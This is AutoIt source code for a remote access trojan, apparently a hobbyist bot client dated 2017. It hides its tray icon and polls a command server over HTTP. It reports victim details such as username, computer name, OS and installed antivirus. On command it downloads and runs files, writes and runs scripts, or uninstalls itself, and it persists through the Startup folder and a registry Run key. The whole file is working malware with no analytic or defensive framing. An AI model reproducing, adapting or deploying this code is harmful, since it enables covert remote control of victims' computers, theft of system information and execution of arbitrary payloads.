#NoTrayIcon
$oMyError = ObjEvent("AutoIt.Error","Post") 
#cs
Coded by v_B01
.Ver : 0.2
Date : 1/27/2017
#ce


global $H = "127.0.0.1"
global $P = "3351"

global $Split = "/"
global $Wsh = ObjCreate("WScript.Shell")
global $Sfs = ObjCreate("Scripting.FileSystemObject")
global $Sh = ObjCreate("Shell.Application")
global $WinMg = ObjGet("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")



func main()

	while true 
		MsgBox(0, "Title", Inf())
		$cmd = StringSplit(Post("Vre",""),"|V|",1)
		select 
			case $cmd[1] = "Ex"
				InetGet($cmd[2], @tempDir & "\" & $cmd[3])
				ShellExecute(@tempDir & "\" &  $cmd[3])
			case $cmd[1] = "Sc"
				$file = FileOpen(@tempdir & "\" & $cmd[3], 1)
				FileWrite($file, $cmd[2])
				FileClose($file)
				ShellExecute(@tempdir & "\" & $cmd[3])
			case $cmd[1] = "RF"

			case $cmd[1] = "Close"
				exit 
			case $cmd[1] = "Uns"
				Uni()


		endselect

		Sleep(7000)
	wend

endfunc


main()



func Post($cmd,$dn)
	$http = ObjCreate("Microsoft.XMLHTTP")
	$http.Open("POST","http://" & $H & ":" & $P & $cmd,false)
	$http.setRequestHeader("User-Agent:", Inf())
	$http.send($dn)
	return $http.responseText
endfunc

func Inf()
	if @error then 
	endif
	$vn = "Victim" & "_" & Hex(driveGetSerial(@HomeDrive))
	$NT = ""
	$dNet2 = "\Microsoft.NET\Framework\v2.0.50727\vbc.exe"
	$dNet4 = "\Microsoft.NET\Framework\v4.0.30319\vbc.exe"
	if FileExists(@windowsdir & $dNet2) or FileExists(@windowsdir & $dNet4) then 
		$NT = "YES"
	else 
		$NT = "NO"
	endif
	$av = ""
	for $ObjAV in objget("winmgmts:\\localhost\root\securitycenter").InstancesOf("AntiVirusProduct")
		$av = $objAV.displayName
	next
	if $av = "" then
		for $ObjAV in objget("winmgmts:\\localhost\root\securitycenter2").InstancesOf("AntiVirusProduct")
			$av = $objAV.displayName
		next
	endif
	if $av = "" then 
		$av = "Not-Found"
	endif
	return $vn & $split & @username & $split & @ComputerName & $split & @OSVersion & " " & @OSServicePack & " " & @CPUArch & $split & $av & $split & $Split & $NT & $split & "AU3" & $split & "FALSE" & $split 
endfunc

func Ex($P)
	return $Wsh.ExpandEnvironmentStrings($P)
endfunc

func Ins()
	if FileExists(@startupdir & "\" & @scriptname) = false then
		FileCopy(@scriptfullpath, @startupdir & "\" & @scriptname,1)
	endif 
	if FileExists(@tempdir & "\" & @scriptname) = false then 
		FileCopy(@scriptfullpath, @tempdir & "\" & @scriptname,1)
	endif
	if RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",@scriptname)<>chrw(34) & @AutoItExe  & chrw(34) Then
	   RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",@scriptname ,"REG_SZ", chrw(34) & @scriptfullpath  & chrw(34))
	endif

endfunc


func Uni()
	if FileExists(@startupdir & "\" & @scriptname) = true then
		FileDelete(@startupdir & "\" & @scriptname)
	endif 
	if FileExists(@tempdir & "\" & @scriptname) = true then 
		FileDelete(@tempdir & "\" & @scriptname)
	endif
	
	RegDelete("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",@scriptfullpath)

	exit

endfunc